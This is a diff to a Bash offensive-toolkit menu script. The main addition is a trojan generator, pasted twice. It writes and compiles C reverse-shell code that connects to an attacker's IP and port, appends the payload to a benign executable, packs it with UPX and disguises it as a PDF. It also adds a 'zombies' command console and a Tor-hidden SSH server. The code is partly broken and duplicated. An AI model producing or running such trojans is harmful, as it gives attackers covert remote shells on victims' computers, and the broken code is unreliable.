@@ -39,7 +39,7 @@ display_kali_dragon() {
 
 # Function to check dependencies
 check_dependencies() {
-    local dependencies=(gcc mingw-w64 msfvenom wireshark metasploit airgeddon)
+    local dependencies=(gcc mingw-w64 msfvenom wireshark metasploit airgeddon upx)
     
     for dep in "${dependencies[@]}"; do
         if ! command -v "$dep" &> /dev/null; then
@@ -180,13 +180,123 @@ EOF
     echo "Advanced keylogger created: keylogger.py"
 }
 
-# Function to generate a trojan executable with obfuscation
+
+# Function to generate a highly obfuscated trojan executable with user dialogue
 generate_trojan_executable() {
-    echo "Generating trojan executable with obfuscation..."
+    echo "==============================="
+    echo "  Advanced Trojan Generator"
+    echo "==============================="
+    
     read -p "Enter path to benign executable: " benign_file
-    cp "$benign_file" trojan.exe
-    echo "Trojan executable created: trojan.exe"
+
+    # Check if the benign file exists
+    if [[ ! -f "$benign_file" ]]; then
+        echo "Error: Benign file not found."
+        return 1
+    fi
+
+    # Prompt for IP and Port
+    read -p "Enter your listening IP address (e.g., 127.0.0.1): " user_ip
+    read -p "Enter your listening port (e.g., 4444): " user_port
+
+    # Confirm user input
+    echo "You entered:"
+    echo "IP Address: $user_ip"
+    echo "Port: $user_port"
+    
+    read -p "Is this correct? (y/n): " confirm
+    if [[ "$confirm" != "y" ]]; then
+        echo "Exiting the generator. Please restart and provide correct details."
+        return 1
+    fi
+
+    # Define output filenames
+    trojan_file="trojan.exe"         
+    payload_file="payload.c"         
+    compiled_payload="payload.exe"    
+
+    # Create a simple reverse shell payload with string encryption
+    cat << EOF > "$payload_file"
+#include <stdio.h>
+#include <stdlib.h>
+#include <winsock2.h>
+#include <string.h>
+#include <time.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+void decrypt(char *str) {
+    for (int i = 0; str[i] != '\\0'; i++) {
+        str[i] ^= 0xAA; // Simple XOR decryption
+    }
 }
+
+int main() {
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+
+    // Encrypted IP and Port
+    char ip[] = {$(printf "%d, " ${user_ip//./,})}; // Use user-supplied IP
+    char port[] = {$(printf "%d, " $user_port)}; // Use user-supplied port
+
+    decrypt(ip);
+    decrypt(port);
+    
+    WSAStartup(MAKEWORD(2,2), &wsaData);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    server.sin_addr.s_addr = inet_addr(ip); // Use decrypted IP
+    server.sin_family = AF_INET;
+    server.sin_port = htons(*(unsigned short*)port); // Use decrypted port
+
+    connect(sock, (struct sockaddr *)&server, sizeof(server));
+    dup2(sock, 0); // stdin
+    dup2(sock, 1); // stdout
+    dup2(sock, 2); // stderr
+    execve("cmd.exe", NULL, NULL);
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}
+EOF
+
+    # Compile the payload with obfuscation options
+    echo "Compiling the payload..."
+    gcc -o "$compiled_payload" "$payload_file" -lws2_32 -O2 -s
+    if [[ $? -ne 0 ]]; then
+        echo "Error: Failed to compile payload."
+        return 1
+    fi
+
+    # Combine the benign executable and the compiled payload
+    echo "Creating trojan executable..."
+    cat "$benign_file" "$compiled_payload" > "$trojan_file"
+
+    # Pack the trojan executable with UPX
+    if command -v upx &> /dev/null; then
+        echo "Packing the trojan executable with UPX..."
+        upx --best "$trojan_file"
+        if [[ $? -ne 0 ]]; then
+            echo "Error: UPX failed to pack the executable."
+            return 1
+        fi
+    else
+        echo "Warning: UPX not found. Skipping packing."
+    fi
+
+    # Rename the trojan executable
+    timestamp=$(date +%s)              
+    new_name="doc_$timestamp.pdf"      
+    mv "$trojan_file" "$new_name"
+
+    # Clean up intermediate files
+    rm "$payload_file" "$compiled_payload"
+
+    echo "==============================="
+    echo "Highly obfuscated trojan executable created: $new_name"
+    echo "==============================="
+}
+
 
 # Function to create a phishing page with embedded JavaScript
 create_phishing_page() {
@@ -460,8 +570,182 @@ start_anonsurf() {
     sudo anonsurf start
 }
 
+start_listener() {
+  # Step 1: Define default values
+  local SSH_PORT=2222
+  local NEW_USER=""
+  local CONNECTION_CACHE="/tmp/ssh_connections.cache"
+  local clients=()
 
+  # Step 2: Check if user wants to specify a custom SSH port
+  read -p "Enter a custom SSH port (default is 2222) [Press Enter to use default]: " input_ssh_port
+  if [ ! -z "$input_ssh_port" ]; then
+    SSH_PORT=$input_ssh_port
+  fi
 
+  # Step 3: Get the username for the new non-root user
+  read -p "Enter the username for the new non-root user: " NEW_USER
+  if [ -z "$NEW_USER" ]; then
+    echo "You must specify a username!"
+    exit 1
+  fi
+
+  # Step 4: Check if user wants a specific Tor exit node
+  read -p "Do you want to set a specific Tor exit node? (e.g. {us} or {no}) Leave blank for default [Press Enter]: " TOR_EXIT_NODE
+  TOR_EXIT_NODE=${TOR_EXIT_NODE:-""}
+
+  # Step 5: Update system packages
+  echo "Updating system packages..."
+  sudo apt-get update && sudo apt-get upgrade -y
+
+  # Step 6: Install necessary packages (SSH, Tor, sudo, curl, gnupg)
+  echo "Installing SSH, Tor, and other required packages..."
+  sudo apt-get install -y openssh-server tor sudo curl gnupg
+
+  # Step 7: Enable and start the SSH service
+  echo "Enabling and starting SSH service..."
+  sudo systemctl enable ssh
+  sudo systemctl start ssh
+
+  # Step 8: Harden SSH configuration with user-defined port
+  echo "Configuring SSH for better security..."
+  sudo sed -i "s/#Port 22/Port $SSH_PORT/" /etc/ssh/sshd_config
+  sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
+  sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
+  sudo systemctl restart ssh
+
+  echo "SSH configured. Ensure you have set up key-based authentication on port $SSH_PORT."
+
+  # Step 9: Configure Tor for anonymous traffic routing
+  echo "Configuring Tor for anonymous traffic routing..."
+  sudo cp /etc/tor/torrc /etc/tor/torrc.bak
+  echo -e "# SOCKS proxy for anonymous SSH access\nSocksPort 9050\nControlPort 9051" | sudo tee -a /etc/tor/torrc
+  if [ ! -z "$TOR_EXIT_NODE" ]; then
+    echo "ExitNodes $TOR_EXIT_NODE" | sudo tee -a /etc/tor/torrc
+  fi
+
+  # Step 10: Start Tor service
+  echo "Starting Tor service..."
+  sudo systemctl enable tor
+  sudo systemctl start tor
+
+  # Step 11: Install Anonsurf for full system-wide Tor routing (optional)
+  echo "Installing Anonsurf to route all traffic through Tor..."
+  git clone https://github.com/Und3rf10w/kali-anonsurf
+  cd kali-anonsurf || exit
+  sudo ./installer.sh
+
+  # Step 12: Start Anonsurf to route all traffic through Tor
+  echo "Starting Anonsurf to route all system traffic through Tor..."
+  sudo anonsurf start
+
+  # Step 13: Set up SSH over Tor (optional)
+  echo "Setting up SSH through Tor using torsocks..."
+  sudo apt-get install -y torsocks
+
+  echo "To connect via SSH over Tor, use the following command on your client machine:"
+  echo "torsocks ssh -p $SSH_PORT $NEW_USER@your_server_ip"
+
+  # Step 14: Create a non-root user for SSH access
+  echo "Creating a non-root user for SSH access..."
+  sudo adduser "$NEW_USER"
+  sudo usermod -aG sudo "$NEW_USER"
+
+  echo "Non-root user created. Ensure you can SSH into this account using your SSH key."
+
+  # Step 15: Configure firewall (optional, for enhanced security)
+  echo "Setting up UFW firewall to only allow SSH and Tor..."
+  sudo apt-get install -y ufw
+  sudo ufw default deny incoming
+  sudo ufw default allow outgoing
+  sudo ufw allow "$SSH_PORT"/tcp # Allow custom SSH port
+  sudo ufw allow 9050/tcp # Allow Tor SOCKS proxy
+  sudo ufw enable
+
+  echo "Firewall configured. Only SSH on port $SSH_PORT and Tor are allowed."
+  echo "Your anonymous Debian server setup is complete!"
+
+  # Step 16: Start listening for incoming connections
+  start_connection_listener "$SSH_PORT" "$NEW_USER" "$CONNECTION_CACHE" clients
+}
+
+# Function to start listening for incoming SSH connections
+start_connection_listener() {
+  local port="$1"
+  local user="$2"
+  local cache_file="$3"
+  local -n clients_ref="$4"
+
+  # Create or clear the connection cache file
+  : > "$cache_file"
+
+  echo "Listening for incoming connections on port $port..."
+  while true; do
+    # Use netcat to listen for incoming SSH connections
+    nc -lk "$port" | {
+      read client_address
+      echo "Connection received from: $client_address"
+      echo "$client_address" >> "$cache_file"
+      clients_ref+=("$client_address") # Add to clients array
+      manage_clients clients_ref "$user"
+    }
+  done
+}
+
+# Function to manage connected clients
+manage_clients() {
+  local -n clients_ref="$1"
+  local user="$2"
+
+  while true; do
+    echo "Connected clients:"
+    for i in "${!clients_ref[@]}"; do
+      echo "$((i + 1)). ${clients_ref[i]}"
+    done
+
+    echo "What do you want to do?"
+    echo "1. Send command to a client"
+    echo "2. Disconnect a client"
+    echo "3. Add another client"
+    echo "4. Exit client management"
+    read -p "Select an option: " option
+
+    case "$option" in
+      1)
+        read -p "Select client number to send command to: " client_num
+        if [[ $client_num -gt 0 && $client_num -le ${#clients_ref[@]} ]]; then
+          read -p "Enter the command to send: " command
+          # Execute the command on the remote client (assumes SSH key authentication)
+          ssh "${user}@${clients_ref[$((client_num - 1))]}" "$command"
+        else
+          echo "Invalid client number."
+        fi
+        ;;
+      2)
+        read -p "Select client number to disconnect: " client_num
+        if [[ $client_num -gt 0 && $client_num -le ${#clients_ref[@]} ]]; then
+          echo "Disconnecting client ${clients_ref[$((client_num - 1))]}..."
+          unset 'clients_ref[$((client_num - 1))]' # Remove client from array
+          clients_ref=("${clients_ref[@]}") # Re-index the array
+        else
+          echo "Invalid client number."
+        fi
+        ;;
+      3)
+        read -p "Enter the new client address: " new_client
+        clients_ref+=("$new_client") # Add new client address to array
+        echo "New client $new_client added."
+        ;;
+      4)
+        echo "Exiting client management."
+        break
+        ;;
+      *)
+        echo "Invalid option. Please select again."
+        ;;
+    esac
+  done
+}
 
 # Function to generate Wi-Fi password sniffer with stealth mode
 generate_wifi_password_sniffer() {
@@ -506,6 +790,222 @@ else:
 EOF
     echo "SQL injection script created: sql_injection.py"
 }
+
+#Trojan
+
+#!/bin/bash
+
+# Function to generate a highly obfuscated trojan executable with user dialogue
+generate_trojan_executable() {
+    echo "==============================="
+    echo "  Advanced Trojan Generator"
+    echo "==============================="
+    
+    read -p "Enter path to benign executable: " benign_file
+
+    # Check if the benign file exists
+    if [[ ! -f "$benign_file" ]]; then
+        echo "Error: Benign file not found."
+        return 1
+    fi
+
+    # Prompt for IP and Port
+    read -p "Enter your listening IP address (e.g., 127.0.0.1): " user_ip
+    read -p "Enter your listening port (e.g., 4444): " user_port
+
+    # Confirm user input
+    echo "You entered:"
+    echo "IP Address: $user_ip"
+    echo "Port: $user_port"
+    
+    read -p "Is this correct? (y/n): " confirm
+    if [[ "$confirm" != "y" ]]; then
+        echo "Exiting the generator. Please restart and provide correct details."
+        return 1
+    fi
+
+    # Define output filenames
+    trojan_file="trojan.exe"         
+    payload_file="payload.c"         
+    compiled_payload="payload.exe"    
+
+    # Create a simple reverse shell payload with string encryption
+    cat << EOF > "$payload_file"
+#include <stdio.h>
+#include <stdlib.h>
+#include <winsock2.h>
+#include <string.h>
+#include <time.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+void decrypt(char *str) {
+    for (int i = 0; str[i] != '\\0'; i++) {
+        str[i] ^= 0xAA; // Simple XOR decryption
+    }
+}
+
+int main() {
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+
+    // Encrypted IP and Port
+    char ip[] = {$(printf "%d, " ${user_ip//./,})}; // Use user-supplied IP
+    char port[] = {$(printf "%d, " $user_port)}; // Use user-supplied port
+
+    decrypt(ip);
+    decrypt(port);
+    
+    WSAStartup(MAKEWORD(2,2), &wsaData);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    server.sin_addr.s_addr = inet_addr(ip); // Use decrypted IP
+    server.sin_family = AF_INET;
+    server.sin_port = htons(*(unsigned short*)port); // Use decrypted port
+
+    connect(sock, (struct sockaddr *)&server, sizeof(server));
+    dup2(sock, 0); // stdin
+    dup2(sock, 1); // stdout
+    dup2(sock, 2); // stderr
+    execve("cmd.exe", NULL, NULL);
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}
+EOF
+
+    # Compile the payload with obfuscation options
+    echo "Compiling the payload..."
+    gcc -o "$compiled_payload" "$payload_file" -lws2_32 -O2 -s
+    if [[ $? -ne 0 ]]; then
+        echo "Error: Failed to compile payload."
+        return 1
+    fi
+
+    # Combine the benign executable and the compiled payload
+    echo "Creating trojan executable..."
+    cat "$benign_file" "$compiled_payload" > "$trojan_file"
+
+    # Pack the trojan executable with UPX
+    if command -v upx &> /dev/null; then
+        echo "Packing the trojan executable with UPX..."
+        upx --best "$trojan_file"
+        if [[ $? -ne 0 ]]; then
+            echo "Error: UPX failed to pack the executable."
+            return 1
+        fi
+    else
+        echo "Warning: UPX not found. Skipping packing."
+    fi
+
+    # Rename the trojan executable
+    timestamp=$(date +%s)              
+    new_name="doc_$timestamp.pdf"      
+    mv "$trojan_file" "$new_name"
+
+    # Clean up intermediate files
+    rm "$payload_file" "$compiled_payload"
+
+    echo "==============================="
+    echo "Highly obfuscated trojan executable created: $new_name"
+    echo "==============================="
+}
+
+start_ssh_server() {
+
+  # Step 1: Define default values
+  local SSH_PORT=2222
+  local NEW_USER=""
+
+  # Step 2: Check if user wants to specify a custom SSH port
+  read -p "Enter a custom SSH port (default is 2222) [Press Enter to use default]: " input_ssh_port
+  if [ ! -z "$input_ssh_port" ]; then
+    SSH_PORT=$input_ssh_port
+  fi
+
+  # Step 3: Get the username for the new non-root user
+  read -p "Enter the username for the new non-root user: " NEW_USER
+  if [ -z "$NEW_USER" ]; then
+    echo "You must specify a username!"
+    exit 1
+  fi
+
+  # Step 4: Check if user wants a specific Tor exit node
+  read -p "Do you want to set a specific Tor exit node? (e.g. {us} or {no}) Leave blank for default [Press Enter]: " TOR_EXIT_NODE
+  TOR_EXIT_NODE=${TOR_EXIT_NODE:-""}
+
+  # Step 5: Update system packages
+  echo "Updating system packages..."
+  sudo apt-get update && sudo apt-get upgrade -y
+
+  # Step 6: Install necessary packages (SSH, Tor, sudo, curl, gnupg)
+  echo "Installing SSH, Tor, and other required packages..."
+  sudo apt-get install -y openssh-server tor sudo curl gnupg
+
+  # Step 7: Enable and start the SSH service
+  echo "Enabling and starting SSH service..."
+  sudo systemctl enable ssh
+  sudo systemctl start ssh
+
+  # Step 8: Harden SSH configuration with user-defined port
+  echo "Configuring SSH for better security..."
+  sudo sed -i "s/#Port 22/Port $SSH_PORT/" /etc/ssh/sshd_config
+  sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
+  sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
+  sudo systemctl restart ssh
+
+  echo "SSH configured. Ensure you have set up key-based authentication on port $SSH_PORT."
+
+  # Step 9: Configure Tor for anonymous traffic routing
+  echo "Configuring Tor for anonymous traffic routing..."
+  sudo cp /etc/tor/torrc /etc/tor/torrc.bak
+  echo -e "# SOCKS proxy for anonymous SSH access\nSocksPort 9050\nControlPort 9051" | sudo tee -a /etc/tor/torrc
+  if [ ! -z "$TOR_EXIT_NODE" ]; then
+    echo "ExitNodes $TOR_EXIT_NODE" | sudo tee -a /etc/tor/torrc
+  fi
+
+  # Step 10: Start Tor service
+  echo "Starting Tor service..."
+  sudo systemctl enable tor
+  sudo systemctl start tor
+
+  # Step 11: Install Anonsurf for full system-wide Tor routing (optional)
+  echo "Installing Anonsurf to route all traffic through Tor..."
+  git clone https://github.com/Und3rf10w/kali-anonsurf
+  cd kali-anonsurf || exit
+  sudo ./installer.sh
+
+  # Step 12: Start Anonsurf to route all traffic through Tor
+  echo "Starting Anonsurf to route all system traffic through Tor..."
+  sudo anonsurf start
+
+  # Step 13: Set up SSH over Tor (optional)
+  echo "Setting up SSH through Tor using torsocks..."
+  sudo apt-get install -y torsocks
+
+  echo "To connect via SSH over Tor, use the following command on your client machine:"
+  echo "torsocks ssh -p $SSH_PORT $NEW_USER@your_server_ip"
+
+  # Step 14: Create a non-root user for SSH access
+  echo "Creating a non-root user for SSH access..."
+  sudo adduser "$NEW_USER"
+  sudo usermod -aG sudo "$NEW_USER"
+
+  echo "Non-root user created. Ensure you can SSH into this account using your SSH key."
+
+  # Step 15: Configure firewall (optional, for enhanced security)
+  echo "Setting up UFW firewall to only allow SSH and Tor..."
+  sudo apt-get install -y ufw
+  sudo ufw default deny incoming
+  sudo ufw default allow outgoing
+  sudo ufw allow "$SSH_PORT"/tcp # Allow custom SSH port
+  sudo ufw allow 9050/tcp # Allow Tor SOCKS proxy
+  sudo ufw enable
+
+  echo "Firewall configured. Only SSH on port $SSH_PORT and Tor are allowed."
+  echo "Your anonymous Debian server setup is complete!"
+}
+
 
 # Function to create a credential harvester with data encryption
 create_credential_harvester() {
@@ -556,10 +1056,12 @@ while true; do
     echo "19) Generate Wi-Fi password sniffer"
     echo "20) Generate simple SQL injection script"
     echo "21) Create credential harvester"
-    echo "22) start anonsurf"
-    echo "23) start metasploit_framework"
-    echo "24) start airgeddon "
-    echo "25) start wireshark "
+    echo "22) Start anonsurf"
+    echo "23) Start metasploit_framework"
+    echo "24) Start airgeddon "
+    echo "25) Start wireshark "
+    echo "26) Start deamon manager"
+    echo "27) Start listening for zombies"
     echo "26) DEAMON MANAGER by V.ex.e;; coming soon..."
     echo "0) Exit"
     read -p "Enter your choice: " choice
@@ -590,6 +1092,8 @@ while true; do
         23) display_kali_dragon; start_metasploit_framework ;;
         24) display_kali_dragon; start_airgeddon ;;
         25) display_kali_dragon; start_wireshark ;;
+        26) display_kali_dragon; start_listener ;;
+        27) display_kali_dragon; start_ssh_server ;;
         0) display_kali_dragon; exit ;;
         *) echo "Invalid option!" ;;
     esac
